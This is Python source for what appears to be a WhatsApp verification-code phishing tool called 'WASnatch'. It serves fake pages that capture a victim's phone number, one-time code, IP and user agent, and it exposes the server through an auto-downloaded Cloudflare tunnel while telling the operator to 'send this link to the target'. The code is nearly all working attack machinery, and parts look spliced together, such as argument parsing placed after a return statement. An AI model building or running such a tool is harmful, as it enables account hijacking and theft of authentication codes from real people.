_sessions = {}
_sess_lock = threading.Lock()


def new_session():
    sid = secrets.token_urlsafe(16)
    with _sess_lock:
        _sessions[sid] = {"phone": "", "ts": time.time()}
    return sid


def get_session(sid):
    with _sess_lock:
        return _sessions.get(sid)


def set_session_phone(sid, phone):
    with _sess_lock:
        _sessions[sid] = {"phone": phone, "ts": time.time()}


def mask(phone):
    if len(phone) <= 7:
        return phone
    return phone[:5] + "\u2022" * (len(phone) - 7) + phone[-2:]


# -------------------------------------------------------------- handler ----

class App(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "WASnatch"
    sys_version = ""

    def log_message(self, *args):
        pass

    # -- helpers ------------------------------------------------------
    def _send(self, status, body, extra=None):
        data = body.encode("utf-8", "replace")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, max-age=0")
        self.send_header("X-Content-Type-Options", "nosniff")
        for key, val in (extra or []):
            self.send_header(key, val)
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def _redirect(self, location, extra=None):
        self.send_response(302)
        self.send_header("Location", location)
        self.send_header("Content-Length", "0")
        for key, val in (extra or []):
            self.send_header(key, val)
        self.end_headers()

    def _form(self):
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            length = 0
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        return parse_qs(raw, keep_blank_values=True)

    def _sid(self):
        cookie = self.headers.get("Cookie") or ""
        match = re.search(r"sid=([A-Za-z0-9_\-]+)", cookie)
        return match.group(1) if match else None

    def _ip(self):
        return (self.headers.get("CF-Connecting-IP")
                or self.headers.get("X-Forwarded-For", "").split(",")[0].strip()
                or self.client_address[0])

    # -- routes -------------------------------------------------------
    def do_GET(self):
        try:
            path = self.path.split("?")[0].rstrip("/") or "/"
            if path == "/":
                self._send(200, page_phone())
            elif path == "/favicon.ico":
                self.send_response(204)
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                self._redirect("/")
        except Exception:
            try:
                self._redirect("/")
            except Exception:
                pass

    def do_POST(self):
        try:
            path = self.path.split("?")[0].rstrip("/") or "/"
            form = self._form()

            if path == "/submit-phone":
                cc = (form.get("cc", ["+92"])[0] or "+92").strip()
                digits = re.sub(r"\D", "", form.get("phone", [""])[0])
                if len(digits) < 7:
                    self._send(200, page_phone(digits))
                    return
                if digits.startswith("0"):
                    digits = digits.lstrip("0") or digits
                phone = f"{cc} {digits}"
                sid = new_session()
                set_session_phone(sid, phone)
                capture_phone(phone, self._ip(), self.headers.get("User-Agent", "-"))
                self._send(
                    200,
                    page_code(mask(phone)),
                    [("Set-Cookie", f"sid={sid}; Path=/; SameSite=Lax")],
                )

            elif path == "/submit-code":
                sid = self._sid()
                phone = (get_session(sid) or {}).get("phone") if sid else ""
                if not phone:
                    phone = form.get("p", [""])[0] or "unknown"
                code = re.sub(r"\D", "", form.get("code", [""])[0])
                capture_code(phone, code or "-", self._ip(),
                             self.headers.get("User-Agent", "-"))
                self._send(200, page_success(REDIRECT))

            else:
                self._redirect("/")
        except Exception:
            try:
                self._redirect("/")
            except Exception:
                pass

ASSETS = {
    ("Windows", "AMD64"): "cloudflared-windows-amd64.exe",
    ("Windows", "x86"): "cloudflared-windows-386.exe",
    ("Linux", "x86_64"): "cloudflared-linux-amd64",

}

BASE_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/"


def find_cloudflared():
    override = os.environ.get("CLOUDFLARED")
    if override and os.path.isfile(override):
        return override
    local = os.path.join(BIN_DIR, "cloudflared.exe" if os.name == "nt" else "cloudflared")
    if os.path.isfile(local):
        return local
    return shutil.which("cloudflared")


def download_cloudflared():
    import platform
    system = platform.system()
    machine = platform.machine()
    asset = ASSETS.get((system, machine))
    if not asset:
        return None

    os.makedirs(BIN_DIR, exist_ok=True)
    target = os.path.join(BIN_DIR, asset)
    url = BASE_URL + asset
    out(f"{D}[*] Downloading cloudflared for {system}/{machine}...{RST}")
    try:
        with urllib.request.urlopen(url, timeout=90) as resp, open(target, "wb") as fh:
            shutil.copyfileobj(resp, fh)
    except Exception as exc:
        out(f"{R}[!] Download failed: {exc}{RST}")
        return None

    if asset.endswith(".tgz"):
        import tarfile
        with tarfile.open(target) as tar:
            tar.extractall(BIN_DIR)
        os.remove(target)
        target = os.path.join(BIN_DIR, "cloudflared")

    if os.name != "nt":
        try:
            os.chmod(target, 0o755)
        except Exception:
            pass

    out(f"{G}[+] cloudflared ready{RST}")
    return target


def ensure_cloudflared():
    found = find_cloudflared()
    if found:
        return found
    return download_cloudflared()


def start_tunnel(port):
    binary = ensure_cloudflared()
    if not binary:
        return None, None

    cmd = [binary, "tunnel", "--url", f"http://127.0.0.1:{port}",
           "--no-autoupdate", "--loglevel", "info"]
    flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, creationflags=flags,
        )
    except Exception as exc:
        out(f"{R}[!] Could not start cloudflared: {exc}{RST}")
        return None, None

    holder = {}
    ready = threading.Event()

    def reader():
        try:
            for line in proc.stdout:
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
                if match and not ready.is_set():
                    holder["url"] = match.group(0)
                    ready.set()
        except Exception:
            pass

    threading.Thread(target=reader, daemon=True).start()
    ready.wait(60)
    return proc, holder.get("url")

def free_port(start):
    for candidate in range(start, start + 50):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.bind(("0.0.0.0", candidate))
                return candidate
            except OSError:
                continue
    return start


def lan_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except Exception:
        return "127.0.0.1"

    parser.add_argument("--redirect", default=DEFAULT_REDIRECT, help="post-capture redirect URL")
    args = parser.parse_args()

    REDIRECT = args.redirect
    banner()

    port = free_port(args.port)
    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), App)
        server.daemon_threads = True
    except Exception as exc:
        out(f"{R}[!] Cannot bind port {port}: {exc}{RST}")
        sys.exit(1)

    threading.Thread(target=server.serve_forever, daemon=True).start()
    out(f"{G}[+] Local server listening on 0.0.0.0:{port}{RST}")

    tunnel = None
    public = None
    if not args.no_tunnel:
        out(f"{D}[*] Opening Cloudflare tunnel...{RST}")
        tunnel, public = start_tunnel(port)

    if public:
        out()
        out(f"{G}{BOLD}{LINE}{RST}")
        out(f"{G}{BOLD}   SEND THIS LINK TO THE TARGET{RST}")
        out(f"{G}{BOLD}{LINE}{RST}")
        out(f"   {C}{BOLD}{public}{RST}")
        out(f"{G}{BOLD}{LINE}{RST}")
        out()
        out(f"{D}   Link is HTTPS and mobile friendly. Keep this window open.{RST}")
    elif args.no_tunnel:
        out()
        out(f"{Y}[!] Tunnel disabled. LAN URL:{RST} {C}http://{lan_ip()}:{port}{RST}")
    else:
        out()
        out(f"{R}[!] Tunnel failed. LAN fallback:{RST} {C}http://{lan_ip()}:{port}{RST}")
        out(f"{D}   Install cloudflared manually and rerun, or use --no-tunnel.{RST}")

    out()
    out(f"{D}   Captures are written to {LOG_FILE}{RST}")
    out(f"{D}   Press Ctrl+C to stop.{RST}")
    out()
    out(f"{Y}[*] Waiting for victim...{RST}")

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        out()
        out(f"{Y}[*] Shutting down...{RST}")
    finally:
        try:
            server.shutdown()
        except Exception:
            pass
        if tunnel:
            try:
                tunnel.terminate()
            except Exception:
                pass


if __name__ == "__main__":
    main()
